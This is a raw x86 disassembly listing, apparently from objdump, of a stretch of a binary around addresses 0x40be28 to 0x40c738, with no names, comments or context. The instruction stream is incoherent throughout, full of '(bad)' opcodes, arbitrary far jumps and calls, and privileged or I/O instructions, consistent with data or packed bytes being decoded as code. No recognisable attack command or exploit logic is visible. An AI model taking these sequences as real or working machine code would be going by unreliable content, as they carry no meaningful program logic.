  40be28:	sar    DWORD PTR [eax+eiz*4],1
  40be2b:	(bad)  
  40be2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be2d:	add    bh,BYTE PTR [esp+ecx*4-0x1fdb7eb4]
  40be34:	into   
  40be35:	add    al,bl
  40be37:	das    
  40be38:	push   eax
  40be39:	push   edi
  40be3a:	loope  0x40be27
  40be3c:	retf   0x4658
  40be3f:	loope  0x40be70
  40be41:	inc    edi
  40be42:	cmp    eax,0xe968a76e
  40be47:	imul   edi,DWORD PTR [ebp+0x43],0xffffffa8
  40be4b:	add    edi,DWORD PTR [edi+0x2703e902]
  40be51:	jmp    0xc3e1:0xdd1983b0
	...
  40be6c:	add    BYTE PTR [ebp+edi*8-0x7c061448],dl
  40be73:	add    eax,0xe96a70e1
  40be78:	add    ecx,DWORD PTR [eax]
  40be7a:	pushf  
  40be7b:	inc    DWORD PTR [eax-0x16bebc3b]
  40be81:	mov    ah,0xdd
  40be83:	je     0x40be76
  40be85:	int3   
  40be86:	loope  0x40be28
  40be88:	faddp  st(7),st
  40be8a:	in     al,0xc
  40be8c:	push   esp
  40be8d:	(bad)  
  40be8e:	(bad)  
  40be90:	push   esp
  40be91:	(bad)  
  40be92:	(bad)  [ecx+esi*8-0x34]
  40be96:	pop    esp
  40be97:	jp     0x40be57
  40be99:	(bad)  
  40be9a:	leave  
  40be9b:	shr    ebp,0xa4
  40be9e:	aaa    
  40be9f:	mov    edi,DWORD PTR [ebp+0x13fbc123]
  40bea5:	stos   DWORD PTR es:[edi],eax
  40bea6:	push   0xaf19e2d
  40beab:	call   0xff1cb17d
  40beb0:	pusha  
  40beb1:	loope  0x40be91
  40beb3:	addr16 jmp 0x11feaa5d
  40beb9:	or     eax,0xfce94142
  40bebe:	push   eax
  40bebf:	inc    ecx
  40bec0:	sub    BYTE PTR [ebx+0x4cf174db],ah
  40bec6:	call   0xdd881d6b
  40becb:	je     0x40bf22
  40becd:	inc    edi
  40bece:	push   edi
  40becf:	or     BYTE PTR [ecx+0x0],al
	...
  40bee6:	loope  0x40bf40
  40bee8:	inc    DWORD PTR [esi+0x6d]
  40beeb:	ret    0xe903
  40beee:	jno    0x40be77
  40bef0:	jmp    0x40bf5c
  40bef2:	push   0xbae969d8
  40bef7:	sub    al,0xff
  40bef9:	pushf  
  40befa:	lods   al,BYTE PTR ds:[esi]
  40befb:	jmp    0xac88:0xdd07a0e8
  40bf02:	lock arpl WORD PTR [eax],ax
  40bf05:	jmp    0xa85d21
  40bf0a:	sub    eax,DWORD PTR [ecx+0x41]
  40bf0d:	add    BYTE PTR [esi],dl
  40bf0f:	push   esi
  40bf10:	inc    eax
  40bf11:	inc    ecx
  40bf12:	(bad)  
  40bf13:	loop   0x40bf88
  40bf15:	or     BYTE PTR [esi-0x36006090],ah
  40bf1b:	outs   dx,BYTE PTR ds:[esi]
  40bf1c:	add    BYTE PTR [eax],al
  40bf1e:	jmp    0x7fc9259f
  40bf23:	inc    ebp
  40bf24:	add    BYTE PTR [eax+0x4c],ch
  40bf27:	inc    ebp
  40bf28:	inc    ecx
  40bf29:	add    cl,ch
  40bf2b:	cmp    DWORD PTR [eax],ecx
  40bf2d:	call   0x3e6476
  40bf32:	stc    
  40bf33:	cmp    esp,edi
  40bf35:	push   DWORD PTR [ebx+0xe]
  40bf38:	call   0xfdfc8730
  40bf3d:	leave  
  40bf3e:	dec    esp
  40bf3f:	or     al,BYTE PTR [eax]
  40bf41:	push   ebp
  40bf42:	add    eax,0x1ac481d3
  40bf47:	xchg   DWORD PTR [ebx+0x10],edx
	...
  40bf5e:	add    ch,dh
  40bf60:	shr    BYTE PTR [eax+0x0],1
  40bf63:	or     ecx,DWORD PTR [edx-0x4]
  40bf66:	push   eax
  40bf67:	stc    
  40bf68:	cmp    DWORD PTR [eax],ecx
  40bf6a:	push   0x7e
  40bf6c:	mov    esp,0x10c91073
  40bf71:	sbb    al,0x85
  40bf73:	mov    ?,WORD PTR [ecx]
  40bf75:	daa    
  40bf76:	mov    edx,DWORD PTR [ebx]
  40bf78:	mov    ebx,0x693e6a8e
  40bf7d:	add    BYTE PTR [eax-0x17],ch
  40bf80:	(bad)  
  40bf81:	(bad)  
  40bf82:	(bad)  
  40bf83:	jns    0x40bfbe
  40bf85:	or     al,0x6a
  40bf87:	jns    0x40bf44
  40bf89:	jo     0x40bf8f
  40bf8b:	jmp    FWORD PTR fs:[ecx+0x0]
  40bf8f:	mov    dh,0xad
  40bf91:	dec    ebx
  40bf92:	add    BYTE PTR [esi],cl
  40bf94:	dec    edi
  40bf95:	(bad)  
  40bf96:	jne    0x40bf3f
  40bf98:	cmc    
  40bf99:	jmp    0x40bffa
  40bf9b:	pop    ecx
  40bf9c:	jmp    0xd52688a3
  40bfa1:	add    dl,BYTE PTR [ebp+0x2c]
  40bfa4:	or     eax,0x5ff3c383
  40bfa9:	cmp    DWORD PTR [esp+ebx*1],edx
  40bfac:	mov    bh,0x68
  40bfae:	add    BYTE PTR [edx],dh
  40bfb0:	cs loopne 0x40c002
  40bfb3:	fdiv   DWORD PTR ds:0xe15aff10
  40bfb9:	push   0xf835c800
  40bfbe:	(bad)  
  40bfbf:	push   ebp
  40bfc0:	icebp  
  40bfc1:	mov    BYTE PTR [edi+0x0],bh
	...
  40bfd7:	add    BYTE PTR [edx],dh
  40bfd9:	add    al,0x8b
  40bfdb:	push   esp
  40bfdc:	mov    bl,0x38
  40bfde:	imul   eax,DWORD PTR [eax],0xff6ae93d
  40bfe4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bfe5:	jmp    0x40bfe9
  40bfe7:	call   DWORD PTR [edx]
  40bfe9:	fsubr  QWORD PTR [eax-0x1]
  40bfec:	nop
  40bfed:	inc    BYTE PTR [edi]
  40bfef:	push   0xffffffa7
  40bff1:	add    eax,0xedce804
  40bff6:	add    al,0x0
  40bff8:	pop    ss
  40bff9:	pop    ecx
  40bffa:	pop    eax
  40bffb:	cld    
  40bffc:	jg     0x40bfbc
  40bffe:	dec    esp
  40bfff:	add    BYTE PTR [edi-0x58f03f5e],ah
  40c005:	xchg   esi,eax
  40c006:	mov    ebx,ebp
  40c008:	pop    eax
  40c009:	scas   eax,DWORD PTR es:[edi]
  40c00a:	or     bh,bh
  40c00c:	fcmovbe st,st(3)
  40c00e:	jmp    0xbafe:0xde48cf52
  40c015:	iret   
  40c016:	jmp    0x47d1:0x2ebea97
  40c01d:	ins    DWORD PTR es:[edi],dx
  40c01e:	ret    
  40c01f:	add    edi,edx
  40c021:	sub    BYTE PTR [eax+0xc],bl
  40c024:	and    BYTE PTR [ebx],al
  40c026:	pushf  
  40c027:	sti    
  40c028:	add    BYTE PTR [ebx-0x5f],dl
  40c02b:	ficom  WORD PTR [ecx]
  40c02d:	ficomp DWORD PTR [ebx-0x6aff609]
  40c033:	fidivr WORD PTR [ebx-0x6]
  40c036:	adc    BYTE PTR [ecx+0x7f],ah
  40c039:	fscale 
  40c03b:	retf   
	...
  40c050:	add    dh,ah
  40c052:	out    dx,al
  40c053:	call   0xee27dc90
  40c058:	push   edi
  40c059:	scas   eax,DWORD PTR es:[edi]
  40c05a:	fstp   DWORD PTR [ebx-0x4]
  40c05d:	sar    ah,0x60
  40c060:	fst    st(1)
  40c062:	fstp   DWORD PTR [ebx+0x10]
  40c065:	mov    edi,0xa7041c87
  40c06a:	inc    edx
  40c06b:	sbb    ebp,ebx
  40c06d:	xor    eax,DWORD PTR [esi]
  40c06f:	mov    esi,0xf1ea8f57
  40c074:	pop    ebx
  40c075:	test   al,0xd9
  40c077:	lods   eax,DWORD PTR ds:[esi]
  40c078:	push   edi
  40c079:	mov    ebx,0x99f41bd9
  40c07e:	dec    edi
  40c07f:	add    esp,ebp
  40c081:	ret    
  40c082:	pop    edx
  40c083:	xchg   esi,eax
  40c084:	fstp   QWORD PTR [edi-0x3c]
  40c087:	hlt    
  40c088:	add    ebx,edx
  40c08a:	lea    edx,[ebx+eax*4-0x2286519c]
  40c091:	jno    0x40c06c
  40c093:	sti    
  40c094:	sti    
  40c095:	sbb    edi,DWORD PTR [edi-0x18]
  40c098:	fbld   TBYTE PTR [ecx-0x27]
  40c09b:	mov    eax,0x510ad3dc
  40c0a0:	mov    esi,0xdd55d952
  40c0a5:	sar    edx,cl
  40c0a7:	pop    ebx
  40c0a8:	xchg   DWORD PTR [eax-0x2f],eax
  40c0ab:	inc    ebp
  40c0ac:	fucomp st(0)
  40c0ae:	fnstenv [ebx+0x4f300f]
  40c0b4:	loope  0x40c0b6
	...
  40c0ca:	cmp    al,0xf5
  40c0cc:	(bad)  
  40c0cd:	add    ch,BYTE PTR cs:[ebx+0x0]
  40c0d1:	xchg   ebx,eax
  40c0d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c0d3:	push   0xffffffff
  40c0d5:	jmp    0xcea3:0x6c8d02a4
  40c0dc:	dec    BYTE PTR [esi]
  40c0de:	mov    ebx,0x5006ff6c
  40c0e3:	repnz imul ebp,ecx,0x5be8027e
  40c0ea:	push   edi
  40c0eb:	add    al,BYTE PTR [eax]
  40c0ed:	es sub cl,ch
  40c0f0:	repnz out 0xfb,al
  40c0f3:	or     BYTE PTR [eax],al
  40c0f5:	jmp    0xddc5829e
  40c0fa:	not    edi
  40c0fc:	(bad)  
  40c0fd:	jmp    0x40c0a3
  40c0ff:	add    al,BYTE PTR [eax]
  40c101:	scas   al,BYTE PTR es:[edi]
  40c102:	and    ecx,edx
  40c104:	repnz mov esi,0xe9fed8d3
  40c10a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c10b:	rol    DWORD PTR [ebp+ebp*4-0x16012689],0xa4
  40c113:	add    al,BYTE PTR [eax]
  40c115:	jb     0x40c0f0
  40c117:	cli    
  40c118:	mov    bh,bl
  40c11a:	inc    BYTE PTR [edx]
  40c11c:	lea    esp,[esp+edx*2-0x2b]
  40c120:	inc    BYTE PTR [esi-0x727b7a4c]
  40c126:	push   edi
  40c127:	fsin   
  40c129:	sbb    DWORD PTR [eax],ebx
  40c12b:	jg     0x40c114
  40c12d:	jp     0x40c12f
	...
  40c143:	sbb    ecx,0x4f
  40c146:	data16 icebp 
  40c148:	repnz (bad) 
  40c14a:	aam    0xa0
  40c14c:	xlat   BYTE PTR ds:[ebx]
  40c14d:	je     0x40c130
  40c14f:	mov    esi,0x3cd4ff02
  40c154:	fst    DWORD PTR [ecx+0x0]
  40c157:	or     al,BYTE PTR [ebx-0x49921745]
  40c15d:	std    
  40c15e:	add    BYTE PTR [ecx-0x80],al
  40c161:	sbb    al,BYTE PTR [ecx]
  40c163:	push   cs
  40c164:	add    al,0x83
  40c166:	mov    ebp,0xfffdb2b2
  40c16b:	inc    BYTE PTR [esi]
  40c16d:	test   BYTE PTR [edi],cl
  40c16f:	inc    DWORD PTR [ebx]
  40c171:	add    bh,al
  40c173:	mov    ecx,DWORD PTR [edi+0x3a1fff1]
  40c179:	add    bh,ch
  40c17b:	mov    al,0x6b
  40c17d:	mov    eax,ds:0x8d043f41
  40c182:	test   esi,ecx
  40c184:	mov    bh,0xfd
  40c186:	call   FWORD PTR [esi-0x41b3ed1a]
  40c18c:	add    eax,DWORD PTR [ebp-0x38bf9540]
  40c192:	test   edx,edi
  40c194:	scas   eax,DWORD PTR es:[edi]
  40c195:	std    
  40c196:	dec    edi
  40c198:	add    ebp,edi
  40c19a:	mov    esi,0x413f6f56
  40c19f:	mov    esi,0x5200838a
  40c1a4:	mov    ebx,0x50fd
	...
  40c1b9:	add    BYTE PTR [eax],al
  40c1bb:	add    BYTE PTR [esi],dh
  40c1bd:	mov    cl,0x49
  40c1bf:	add    BYTE PTR [esi-0x7e],bh
  40c1c2:	mov    esi,0x83c45d74
  40c1c7:	aam    0x1d
  40c1c9:	mov    ebx,0xec8e02fd
  40c1ce:	mov    esp,0x413d3568
  40c1d3:	add    BYTE PTR [ebx],al
  40c1d5:	cmp    dh,0xfb
  40c1d8:	sar    DWORD PTR [ebx+0x4798e84e],1
  40c1de:	add    BYTE PTR [eax],al
  40c1e0:	retf   
  40c1e1:	mov    esi,0x8ca7850d
  40c1e6:	add    eax,DWORD PTR [eax]
  40c1e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1e9:	sar    DWORD PTR [ecx-0x781619c0],0x84
  40c1f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1f1:	or     eax,0x41d7fedb
  40c1f6:	mov    bl,0x4b
  40c1f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1f9:	jmp    0x7ad4820b
  40c1fe:	test   DWORD PTR [edi*4-0x58ffbc55],edi
  40c205:	loopne 0x40c285
  40c207:	and    BYTE PTR [edi+0x32ff02e9],0xf1
  40c20e:	(bad)  
  40c20f:	(bad)  
  40c210:	lock addr16 sbb edi,0xfed9cff4
  40c218:	sbb    dl,ch
  40c21a:	aad    0xfe
  40c21c:	fmul   DWORD PTR [edi-0x80]
  40c21f:	jecxz  0x40c221
	...
  40c235:	aam    0xb7
  40c237:	(bad)  [edx+eiz*1-0x3f012a6f]
  40c23e:	sbb    BYTE PTR [esi+0x1],ch
  40c241:	dec    ebp
  40c242:	jmp    0xe97dc2b3
  40c247:	ins    BYTE PTR es:[edi],dx
  40c248:	add    BYTE PTR [edx],bl
  40c24a:	data16 jecxz 0x40c23f
  40c24d:	mov    al,ds:0xb2ff32a5
  40c252:	mov    cl,0x44
  40c254:	inc    ecx
  40c255:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c256:	rol    dl,1
  40c258:	jae    0x40c23a
  40c25a:	ins    BYTE PTR es:[edi],dx
  40c25b:	dec    edi
  40c25c:	adc    al,0x80
  40c25e:	das    
  40c25f:	mov    ebx,0xd97d78f2
  40c264:	mov    ah,0x53
  40c266:	pop    ecx
  40c267:	(bad)  
  40c269:	push   0x1afef2d7
  40c26e:	jo     0x40c245
  40c270:	(bad)  
  40c271:	pop    eax
  40c272:	add    edx,DWORD PTR [ecx-0x22]
  40c275:	push   ebx
  40c276:	(bad)  
  40c277:	pop    ebp
  40c278:	ficom  DWORD PTR [ebx]
  40c27a:	mov    bh,0x59
  40c27c:	fiadd  DWORD PTR [ecx-0x15]
  40c27f:	cs dec ebp
  40c281:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c282:	add    dl,BYTE PTR [edx-0x8]
  40c285:	xor    DWORD PTR [eax-0x2b],edx
  40c288:	(bad)  
  40c28a:	jmp    0xe773:0xd621da39
  40c291:	adc    eax,0x9bda25d6
  40c296:	repnz sbb eax,0x90
	...
  40c2ac:	add    BYTE PTR [eax],al
  40c2ae:	hlt    
  40c2af:	rcl    DWORD PTR ds:0xbb408da,1
  40c2b5:	(bad)  
  40c2b7:	aad    0x3b
  40c2b9:	out    0xf5,eax
  40c2bb:	aad    0xfd
  40c2bd:	jmp    0xc0ee:0x3e949d4
  40c2c4:	aam    0x3
  40c2c6:	jb     0x40c251
  40c2c8:	aam    0x85
  40c2ca:	in     al,0x9a
  40c2cc:	xor    eax,0x61ee738d
  40c2d1:	div    BYTE PTR [ebx]
  40c2d3:	inc    eax
  40c2d4:	xchg   ecx,eax
  40c2d5:	xor    al,0x4d
  40c2d7:	add    al,dh
  40c2d9:	dec    edi
  40c2da:	mov    ds:0x3d0c33d5,eax
  40c2df:	add    dh,BYTE PTR [esi+0x1ad5bb4f]
  40c2e5:	xor    BYTE PTR [edx],ah
  40c2e7:	ret    0x301b
  40c2ea:	push   0xa7045d3f
  40c2ef:	add    ch,cl
  40c2f1:	mov    ebx,ds
  40c2f3:	call   0x3445:0x3f2bf661
  40c2fa:	and    bh,BYTE PTR [edi]
  40c2fc:	test   eax,0xfff2fd34
  40c301:	jne    0x40c2f3
  40c303:	call   0xa57c:0x81af1bfe
  40c30a:	stos   DWORD PTR es:[edi],eax
  40c30b:	dec    esi
  40c30c:	daa    
  40c30d:	ins    BYTE PTR es:[edi],dx
  40c30e:	lock ret 0xdcfe
	...
  40c326:	add    BYTE PTR [eax-0x2c],dl
  40c329:	je     0x40c324
  40c32b:	pop    edi
  40c32c:	or     al,0xff
  40c32e:	mov    esp,0xf174d5a8
  40c333:	cmp    al,0xb1
  40c335:	cld    
  40c336:	ss (bad) 
  40c338:	shl    DWORD PTR [esi],cl
  40c33a:	inc    ecx
  40c33b:	or     BYTE PTR [ecx+0x0],0xe9
  40c33f:	sub    edi,DWORD PTR [ebx+eax*1+0x7496601e]
  40c346:	aaa    
  40c347:	adc    cl,BYTE PTR [edx+ecx*4+0x11881cb4]
  40c34e:	push   es
  40c34f:	pusha  
  40c350:	call   0x2bc9:0x359c9bfe
  40c357:	fcmovnbe st,st(4)
  40c359:	push   ebx
  40c35a:	(bad)  
  40c35b:	iret   
  40c35c:	add    ebx,0xfed3eee1
  40c362:	sbb    ch,BYTE PTR ss:[esi]
  40c365:	adc    BYTE PTR [edx-0x46],ah
  40c368:	test   DWORD PTR [ecx+edx*8+0x19fed3de],eax
  40c36f:	inc    ecx
  40c370:	add    bh,bh
  40c372:	xor    al,0x9b
  40c374:	push   0xf2f1b600
  40c379:	(bad)  
  40c37a:	sbb    edi,DWORD PTR [edi+0x61cbf7d]
  40c380:	mov    esp,0xd56e9d84
  40c385:	(bad)  
  40c386:	jmp    0x6240c62f
	...
  40c39f:	add    BYTE PTR [ecx],cl
  40c3a1:	int3   
  40c3a2:	std    
  40c3a3:	add    BYTE PTR [ecx],ch
  40c3a5:	mov    ebx,0x54fb1289
  40c3aa:	sti    
  40c3ab:	(bad)  
  40c3ac:	fnstcw WORD PTR [edx-0x3c72b2]
  40c3b2:	(bad)  
  40c3b3:	dec    ecx
  40c3b5:	punpckhdq mm2,QWORD PTR [eax]
  40c3b8:	jmp    0xda3fba41
  40c3bd:	mov    edx,0x7f5a52fd
  40c3c2:	mov    ebx,0xfdbae8fc
  40c3c7:	add    dl,dh
  40c3c9:	sbb    eax,0xbb0ebd8d
  40c3ce:	std    
  40c3cf:	dec    ecx
  40c3d1:	inc    esp
  40c3d2:	adc    bh,bh
  40c3d4:	xor    edi,esp
  40c3d6:	push   esi
  40c3d7:	push   DWORD PTR [ebx]
  40c3d9:	or     al,ch
  40c3db:	adc    ebx,DWORD PTR [ecx-0x3e7c0246]
  40c3e1:	iret   
  40c3e2:	std    
  40c3e3:	lea    ebp,[edx+0x73fffdb9]
  40c3e9:	loope  0x40c3d4
  40c3eb:	stos   BYTE PTR es:[edi],al
  40c3ec:	inc    ebp
  40c3ed:	fs idiv esi
  40c3f0:	leave  
  40c3f1:	stos   DWORD PTR es:[edi],eax
  40c3f2:	mov    DWORD PTR [edx],edx
  40c3f4:	leave  
  40c3f5:	jno    0x40c3ed
  40c3f7:	(bad)  
  40c3f8:	jmp    0xc693c1a8
  40c3fd:	or     al,0xc9
  40c3ff:	ret    0xffda
  40c402:	push   esp
  40c403:	mov    eax,DWORD PTR [eax]
	...
  40c419:	fidivr DWORD PTR [ebp-0x3e]
  40c41c:	clc    
  40c41d:	call   0x598c1cd
  40c422:	adc    cl,BYTE PTR [ebx+ecx*4]
  40c425:	jl     0x40c3b1
  40c427:	cmp    eax,0x48
  40c42a:	stos   DWORD PTR es:[edi],eax
  40c42b:	std    
  40c42c:	push   eax
  40c42d:	mov    ah,0xfe
  40c42f:	imul   eax,DWORD PTR [eax],0xc506ca7
  40c435:	js     0x40c44e
  40c437:	sbb    al,0x85
  40c439:	addr16 (bad) 
  40c43b:	xor    eax,0x455e2c7
  40c440:	add    BYTE PTR [edi+0x328a72e9],ah
  40c446:	push   ecx
  40c447:	(bad)  
  40c448:	(bad)  
  40c449:	push   eax
  40c44a:	push   eax
  40c44b:	repnz mov edx,fs
  40c44e:	xor    eax,0x2d2a8d34
  40c453:	(bad)  
  40c454:	(bad)  
  40c455:	cmp    BYTE PTR [ecx+0x56301068],bl
  40c45b:	fdiv   st(5),st
  40c45d:	sub    BYTE PTR [edi+edx*8],dl
  40c460:	push   ecx
  40c461:	mov    bl,0x39
  40c463:	cmp    DWORD PTR [ebx+ebx*1-0x17],0x72
  40c468:	jae    0x40c431
  40c46a:	dec    esi
  40c46b:	cdq    
  40c46c:	sti    
  40c46d:	or     esp,esi
  40c46f:	(bad)  
  40c470:	pop    DWORD PTR [eax]
  40c472:	jbe    0x40c47a
  40c474:	push   DWORD PTR [edx-0x1f]
  40c477:	sub    eax,0xd6fc9fe8
  40c47c:	inc    BYTE PTR [eax]
	...
  40c492:	and    al,0x1c
  40c494:	hlt    
  40c495:	(bad)  
  40c496:	loopne 0x40c435
  40c498:	(bad)  
  40c499:	(bad)  
  40c49a:	push   edx
  40c49b:	add    dh,BYTE PTR [edx+ebp*8+0x15]
  40c49f:	push   eax
  40c4a0:	jo     0x40c499
  40c4a2:	leave  
  40c4a3:	mov    bl,0xd5
  40c4a5:	mov    dl,BYTE PTR [ebp-0x46087054]
  40c4ab:	ret    
  40c4ac:	aad    0xfe
  40c4ae:	push   ebp
  40c4af:	shl    DWORD PTR ds:0x2d0e5c9,1
  40c4b5:	push   ebp
  40c4b6:	sub    al,0xc8
  40c4b8:	add    ebx,0x74d6fa57
  40c4be:	mov    ds:0xdfcc9102,eax
  40c4c3:	add    ch,cl
  40c4c5:	or     ah,BYTE PTR [edi+0x58]
  40c4c8:	in     al,dx
  40c4c9:	xor    eax,0x3dcc56e
  40c4ce:	push   esi
  40c4cf:	jecxz  0x40c53a
  40c4d1:	ret    
  40c4d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c4d3:	jge    0x40c46d
  40c4d5:	mov    bl,ch
  40c4d7:	ficomp WORD PTR [eax]
  40c4d9:	xor    bl,BYTE PTR [eax+0x58]
  40c4dc:	fucomp st(3)
  40c4de:	les    eax,FWORD PTR [eax-0x4482299b]
  40c4e4:	outs   dx,DWORD PTR ds:[esi]
  40c4e5:	dec    eax
  40c4e6:	pop    ebx
  40c4e7:	fsubrp st(2),st
  40c4e9:	or     eax,0x2ca498a8
  40c4ee:	inc    ebx
  40c4ef:	add    al,0xac
  40c4f1:	scas   eax,DWORD PTR es:[edi]
  40c4f2:	out    0x85,eax
  40c4f4:	aas    
  40c4f5:	out    dx,eax
	...
  40c50a:	add    BYTE PTR [esi+0x2fce01d3],dl
  40c510:	pop    eax
  40c511:	sbb    edx,ebp
  40c513:	enter  0xf618,0x8d
  40c517:	and    BYTE PTR fs:0xab688f33,cl
  40c51e:	inc    esp
  40c51f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c520:	jg     0x40c4c5
  40c522:	mov    ebx,0x4c14da60
  40c527:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c528:	add    ch,BYTE PTR [edx-0x41]
  40c52b:	lods   al,BYTE PTR ds:[esi]
  40c52c:	jg     0x40c4d9
  40c52e:	mov    ebx,0xb373d168
  40c533:	enter  0x617a,0xd5
  40c537:	leave  
  40c538:	jnp    0x40c55d
  40c53a:	mov    ah,0x6a
  40c53c:	test   esi,edx
  40c53e:	lock ss mov ch,0x67
  40c542:	pop    edi
  40c543:	fcmovnbe st,st(1)
  40c545:	call   0x34126c4d
  40c54a:	mov    al,0x8
  40c54c:	imul   eax,DWORD PTR [eax],0x8d02e42b
  40c552:	and    al,0x53
  40c554:	inc    ecx
  40c555:	call   0x43a1bf
  40c55a:	push   0x67
  40c55c:	std    
  40c55d:	mov    WORD PTR [ebx+edi*1],gs
  40c560:	inc    ecx
  40c561:	call   DWORD PTR [ebx+edi*1]
  40c564:	jmp    0xd092c7c0
  40c569:	mov    BYTE PTR [ebx+ebx*1],ah
  40c56c:	jle    0x40c5b2
  40c56e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
	...
  40c583:	add    BYTE PTR [ebx-0x3c668b2f],dl
  40c589:	pop    ebp
  40c58a:	inc    edx
  40c58b:	test   al,0xa4
  40c58d:	shl    DWORD PTR [ecx+ebx*8],1
  40c590:	lea    eax,[ebx+0x0]
  40c593:	inc    ecx
  40c594:	(bad)  
  40c595:	dec    esp
  40c596:	dec    DWORD PTR [esi-0x62]
  40c599:	ret    0x6d0e
  40c59c:	mov    edx,0x2de9fed1
  40c5a1:	inc    esi
  40c5a2:	enter  0x706a,0xbe
  40c5a6:	(bad)  
  40c5a7:	fst    QWORD PTR [eax-0x5b17007d]
  40c5ad:	shl    DWORD PTR [ebp+ebp*8+0xc],1
  40c5b1:	add    eax,0xb3a4e949
  40c5b6:	fild   QWORD PTR [edx-0x15]
  40c5b9:	add    cl,BYTE PTR [ecx+0x74d014ac]
  40c5bf:	in     eax,dx
  40c5c0:	sub    eax,DWORD PTR [esi-0x4c]
  40c5c3:	imul   BYTE PTR [ecx-0x42]
  40c5c6:	mov    fs,WORD PTR [esp+eiz*8+0x23b174cf]
  40c5cd:	inc    esi
  40c5ce:	les    esp,FWORD PTR [esi-0x1700717f]
  40c5d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c5d5:	add    al,BYTE PTR [ebx+0x411b750c]
  40c5db:	add    BYTE PTR [esi+0x13507404],bh
  40c5e1:	adc    DWORD PTR [eax+0x6a03e450],edi
	...
  40c5fb:	add    BYTE PTR [eax],al
  40c5fd:	in     al,0x6
  40c5ff:	lea    eax,[ebp-0x12]
  40c602:	adc    ebp,DWORD PTR [edx+0x0]
  40c605:	adc    edx,DWORD PTR [ecx]
  40c607:	rcl    BYTE PTR [eax+0x11],0xe1
  40c60b:	push   eax
  40c60c:	sub    DWORD PTR [edi+0x6ac00b06],edi
  40c612:	repnz cmp BYTE PTR [ebp-0x5e],0x3
  40c617:	je     0x40c645
  40c619:	int    0x38
  40c61b:	adc    BYTE PTR [eax],al
  40c61d:	pop    edx
  40c61e:	cld    
  40c61f:	mov    dl,BYTE PTR [ebp+0x4e]
  40c622:	mov    DWORD PTR cs:[edx],0x75ff06a1
  40c629:	inc    esi
  40c62a:	mov    bh,0x73
  40c62c:	mov    eax,0xffbc40e1
  40c631:	jmp    0x40c63a
  40c633:	push   0xbce70e03
  40c638:	call   0x3e6fa7
  40c63d:	rol    DWORD PTR [eax-0x44],0xe8
  40c641:	aam    0xe
  40c643:	add    BYTE PTR [eax],al
  40c645:	mov    eax,ds:0x62e8c840
  40c64a:	cmp    eax,0x40a1ffff
  40c64f:	shr    al,1
  40c651:	pop    edx
  40c652:	cmp    eax,0xbd40ffff
  40c657:	ror    BYTE PTR [esi+ecx*8],0x20
  40c65b:	mov    ebp,esp
  40c65d:	cmp    eax,0x8dc68f
	...
  40c676:	jnp    0x40c62a
  40c678:	dec    esi
  40c679:	push   0x41488c
  40c67e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c67f:	inc    ebx
  40c680:	or     DWORD PTR [edx-0x59],ebp
  40c683:	inc    ecx
  40c684:	push   ss
  40c685:	inc    edx
  40c686:	data16 (bad) 
  40c689:	mov    ebp,0x8502d9ef
  40c68e:	addr16 call 0xd9e8860e
  40c694:	add    cl,BYTE PTR [ebx+0x117ea5f2]
  40c69a:	xor    ah,BYTE PTR [esi]
  40c69c:	int3   
  40c69d:	dec    edi
  40c69e:	js     0x40c68e
  40c6a0:	iret   
  40c6a1:	(bad)  
  40c6a2:	aad    0xdd
  40c6a4:	xchg   DWORD PTR [edi-0x8dae68],edi
  40c6aa:	pusha  
  40c6ab:	fld    DWORD PTR [ebp+0x1d95f7c]
  40c6b1:	test   BYTE PTR [ebx],bh
  40c6b3:	fld    DWORD PTR [edx]
  40c6b5:	add    BYTE PTR [eax-0x62],ah
  40c6b8:	mov    dh,0xff
  40c6ba:	inc    eax
  40c6bb:	fld    DWORD PTR [edx]
  40c6bd:	(bad)  
  40c6be:	loop   0x40c6d1
  40c6c0:	add    al,0x0
  40c6c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6c3:	fxch   st(1)
  40c6c5:	inc    esp
  40c6c6:	push   edi
  40c6c7:	icebp  
  40c6c8:	add    eax,DWORD PTR [eax]
  40c6ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6cb:	sub    BYTE PTR [ecx-0x34],cl
  40c6ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6cf:	fld    DWORD PTR [edx]
  40c6d1:	add    BYTE PTR [esi+esi*2],bl
  40c6d4:	retf   0xb58a
  40c6d7:	push   esi
  40c6d8:	dec    ecx
  40c6d9:	int3   
	...
  40c6ee:	add    BYTE PTR [edi+0x5e],dl
  40c6f1:	dec    ecx
  40c6f2:	rcl    BYTE PTR [edi-0x7d],1
  40c6f5:	add    edi,edi
  40c6f7:	jp     0x40c6ea
  40c6f9:	rcl    BYTE PTR [ecx-0x65],cl
  40c6fc:	aam    0xc2
  40c6fe:	je     0x40c77b
  40c700:	pop    esp
  40c701:	push   ecx
  40c702:	int3   
  40c703:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c704:	dec    esi
  40c705:	inc    ecx
  40c706:	adc    DWORD PTR [edx-0xb],0x3
  40c70a:	je     0x40c76d
  40c70c:	add    dl,BYTE PTR [ecx+0x66]
  40c70f:	gs inc ecx
  40c711:	jmp    0xc0f6fae8
  40c716:	enter  0x268,0xe9
  40c71a:	(bad)  
  40c71b:	call   0x68aaba75
  40c720:	add    ebp,ecx
  40c722:	add    ebp,DWORD PTR [esi]
  40c724:	dec    eax
  40c725:	mov    eax,ds:0x23c5a9de
  40c72a:	mov    esp,0x3e8ce88
  40c72f:	sbb    BYTE PTR [eax-0x4f],0xd2
  40c733:	repz mov dh,0x95
  40c736:	pop    eax
  40c737:	lahf   
  40c738:	fiadd  DWORD PTR [esi-0x7a319630]
